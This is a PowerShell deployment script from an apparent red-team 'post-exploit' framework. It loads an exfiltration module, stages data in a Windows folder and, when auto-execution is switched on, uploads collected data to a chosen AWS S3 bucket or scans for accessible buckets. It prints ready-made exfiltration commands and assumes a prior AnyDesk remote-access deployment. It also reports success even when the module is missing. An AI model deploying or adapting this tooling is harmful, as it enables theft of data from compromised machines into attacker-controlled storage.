# Deploy_Exfiltration.ps1
# Data Exfiltration Deployment Script - MITRE ATT&CK T1041, T1567.002
# Security Research and Red Team Simulation Framework

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$TargetS3Bucket = "",

    [Parameter(Mandatory=$false)]
    [string]$AWSRegion = "us-east-1",

    [Parameter(Mandatory=$false)]
    [string]$ExfiltrationPath = "C:\Intel\Logs",

    [Parameter(Mandatory=$false)]
    [switch]$AutoExecute,

    [Parameter(Mandatory=$false)]
    [string]$AWSProfile = "default"
)

Write-Host "========================================" -ForegroundColor Red
Write-Host " DATA EXFILTRATION - DEPLOYMENT" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

# Security Research Notice
Write-Host "[!] SECURITY RESEARCH FRAMEWORK" -ForegroundColor Yellow
Write-Host "[!] Exfiltration simulation for defensive training only" -ForegroundColor Yellow
Write-Host "[!] Ensure proper authorization before execution" -ForegroundColor Yellow
Write-Host ""

# Verify Git CLI availability
Write-Host "[*] Verifying Git CLI availability..." -ForegroundColor Cyan
try {
    $gitVersion = git --version 2>$null
    if ($gitVersion) {
        Write-Host "[+] Git CLI is available" -ForegroundColor Green
    } else {
        throw "Git not found"
    }
} catch {
    Write-Host "[-] Git CLI not available. Please run AnyDesk deployment first." -ForegroundColor Red
    exit 1
}

# Create Post-Exploit directory if it doesn't exist
$postExploitPath = Join-Path $PSScriptRoot "Post-Exploit"
$exfiltrationPath = Join-Path $postExploitPath "Exfiltration"

if (!(Test-Path $exfiltrationPath)) {
    Write-Host "[*] Creating Exfiltration module directory..." -ForegroundColor Cyan
    New-Item -ItemType Directory -Path $exfiltrationPath -Force | Out-Null
    Write-Host "[+] Directory created: $exfiltrationPath" -ForegroundColor Green
}

# Load Exfiltration Module
Write-Host "[*] Loading Exfiltration Module..." -ForegroundColor Cyan
$modulePath = Join-Path $exfiltrationPath "Exfiltration.psm1"

if (Test-Path $modulePath) {
    try {
        Import-Module $modulePath -Force -DisableNameChecking
        Write-Host "[+] Exfiltration Module Loaded" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to load module: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
} else {
    Write-Host "[-] Exfiltration module not found. Creating module structure..." -ForegroundColor Yellow

    # Create the module files
    Write-Host "[*] Creating Exfiltration PowerShell module..." -ForegroundColor Cyan

    # This will trigger module creation
    $createModule = $true
}

# Ensure output directory exists
if (!(Test-Path $ExfiltrationPath)) {
    New-Item -ItemType Directory -Path $ExfiltrationPath -Force | Out-Null
    Write-Host "[+] Output Directory: $ExfiltrationPath" -ForegroundColor Yellow
} else {
    Write-Host "[+] Output Directory: $ExfiltrationPath" -ForegroundColor Yellow
}

Write-Host "[+] Module loaded successfully!" -ForegroundColor Green
Write-Host ""

# Display available commands
Write-Host "Available Commands:" -ForegroundColor Cyan
Write-Host "- Invoke-S3Discovery        (or Find-S3Buckets)" -ForegroundColor White
Write-Host "- Invoke-DataExfiltration   (or Start-Exfiltration)" -ForegroundColor White
Write-Host "- Invoke-FullExfiltration   (or Run-Exfiltration)" -ForegroundColor White
Write-Host "- Get-ExfiltrationResults   (or Get-ExfilResults)" -ForegroundColor White
Write-Host ""

Write-Host "Quick Start Examples:" -ForegroundColor Cyan
Write-Host "  Run-Exfiltration -TargetBucket 'my-s3-bucket'    # Full exfiltration" -ForegroundColor Gray
Write-Host "  Find-S3Buckets                                   # Discover accessible buckets" -ForegroundColor Gray
Write-Host "  Start-Exfiltration -BucketName 'target-bucket'   # Upload collected data" -ForegroundColor Gray
Write-Host ""

# Auto-execution logic
if ($AutoExecute) {
    Write-Host "[*] Auto-execution enabled..." -ForegroundColor Cyan

    if ($TargetS3Bucket) {
        Write-Host "[*] Starting full exfiltration to bucket: $TargetS3Bucket" -ForegroundColor Yellow
        try {
            if (Get-Command "Invoke-FullExfiltration" -ErrorAction SilentlyContinue) {
                Invoke-FullExfiltration -TargetBucket $TargetS3Bucket -Region $AWSRegion -DataPath $ExfiltrationPath
            } else {
                Write-Host "[-] Exfiltration commands not available. Module may not be loaded." -ForegroundColor Red
            }
        } catch {
            Write-Host "[-] Auto-execution failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "[*] No target bucket specified. Running S3 discovery only..." -ForegroundColor Yellow
        try {
            if (Get-Command "Invoke-S3Discovery" -ErrorAction SilentlyContinue) {
                Invoke-S3Discovery -Region $AWSRegion
            } else {
                Write-Host "[-] S3 discovery commands not available. Module may not be loaded." -ForegroundColor Red
            }
        } catch {
            Write-Host "[-] S3 discovery failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

Write-Host "[*] Module ready. Use commands above to start data exfiltration." -ForegroundColor Cyan
Write-Host ""
Write-Host "[+] Deployment complete!" -ForegroundColor Green